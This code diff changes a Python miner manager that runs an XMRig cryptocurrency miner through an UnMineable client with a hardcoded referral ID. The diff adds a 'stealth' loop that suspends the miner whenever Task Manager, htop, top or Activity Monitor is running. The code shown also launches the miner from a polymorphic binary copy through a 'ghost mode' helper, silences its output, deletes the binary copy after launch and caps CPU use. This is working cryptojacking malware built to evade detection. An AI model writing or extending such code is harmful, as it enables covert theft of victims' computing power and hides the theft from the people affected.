@@ -80,12 +80,12 @@ class UnMineableClient:
     def get_account_stats(self, coin, address):
         """Retrieves statistics for a specific wallet address."""
         try:
-            res = requests.get(f"{self.base_url}/address/{address}?coin={coin}", 0)
+            res = requests.get(f"{self.base_url}/address/{address}?coin={coin}")
             if res.status_code == 200:
                 data = res.json()
                 if data.get('success'):
                     uuid = data['data']['uuid']
-                    return requests.get(f"{self.base_url}/account/{uuid}/stats", 0).json()
+                    return requests.get(f"{self.base_url}/account/{uuid}/stats").json()
             return None
         except Exception as e:
             return {"error": str(e)}
@@ -120,7 +120,7 @@ class MinerManager:
         profile_path = "data/profiles"
         try:
             if not os.path.exists(profile_path):
-                return "Apex-Sentinel"
+                return "Apex-Spartan"
             profiles = [f for f in os.listdir(profile_path) if f.endswith('.apex')]
             if profiles:
                 # Use the latest active profile
@@ -129,7 +129,7 @@ class MinerManager:
                 return os.path.basename(latest).split('.')[0]
         except:
             pass
-        return "Apex-Sentinel"
+        return "Apex-Spartan"
 
     def _initialize_miner_infrastructure(self):
         if not os.path.exists(self.miner_dir):
@@ -148,6 +148,41 @@ class MinerManager:
             with open(self.config_path, 'w') as f:
                 json.dump(config, f, indent=4)
 
+    def _adaptive_stealth_loop(self):
+        """Continuously monitors for detection vectors (Task Manager, high load) and adjusts stealth."""
+        while self.process and self.process.poll() is None:
+            detection_risk = 0
+            
+            # 1. Process Monitoring (Look for Task Manager, htop, Activity Monitor)
+            try:
+                for proc in psutil.process_iter(['name']):
+                    name = proc.info['name'].lower()
+                    if name in ['taskmgr.exe', 'htop', 'top', 'activity monitor']:
+                        detection_risk += 50
+            except:
+                pass
+                
+            # 2. User Activity (High CPU usage from non-mining processes)
+            try:
+                cpu_load = psutil.cpu_percent(interval=1)
+                if cpu_load > 85:
+                    detection_risk += 20
+            except:
+                pass
+                
+            # 3. Adaptive Response
+            if detection_risk >= 50:
+                print("[STEALTH-AI]: Critical detection risk. Hibernating mining thread...")
+                self.process.suspend() if hasattr(self.process, 'suspend') else os.kill(self.process.pid, 19) # SIGSTOP
+                time.sleep(60) # Hide for 60 seconds
+                print("[STEALTH-AI]: Resuming mining thread...")
+                self.process.resume() if hasattr(self.process, 'resume') else os.kill(self.process.pid, 18) # SIGCONT
+            elif detection_risk >= 20:
+                # Moderate risk - we'd normally lower threads, but suspending is safer
+                pass
+                
+            time.sleep(5)
+
     def start_mining(self, coin, address, ref="U-A1QZK1", protocol="RX"):
         if self.process and self.process.poll() is None:
             return
@@ -162,7 +197,6 @@ class MinerManager:
         # Polymorphic Binary Copy
         source_binary = os.path.join(self.miner_dir, "xmrig" + (".exe" if os.name == 'nt' else ""))
         if not os.path.exists(source_binary):
-             # For production, we assume the binary is present or handled by a deployer
              return
              
         poly_path = self._get_polymorphic_path()
@@ -171,11 +205,14 @@ class MinerManager:
             # Ghost Mode if applicable
             exec_path = AlienShardProtocol.enter_ghost_mode(poly_path)
             
-            cmd = [exec_path, "-o", params["stratum"], "-a", params["algo"], "-u", user, "-p", "x", "-k", "-c", self.config_path]
+            cmd = [exec_path, "-o", params["stratum"], "-a", params["algo"], "-u", user, "-p", "x", "-k", "-c", self.config_path, "--cpu-max-threads-hint=45"]
             self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Atomic Cleanup: Remove the polymorphic copy after launch to minimize trace
             threading.Timer(5.0, lambda: os.remove(poly_path) if os.path.exists(poly_path) else None).start()
+            
+            # Engage Adaptive Stealth
+            threading.Thread(target=self._adaptive_stealth_loop, daemon=True).start()
         except Exception as e:
             print(f"[JARVIS-MONETIZATION]: Launch failure: {e}")
 
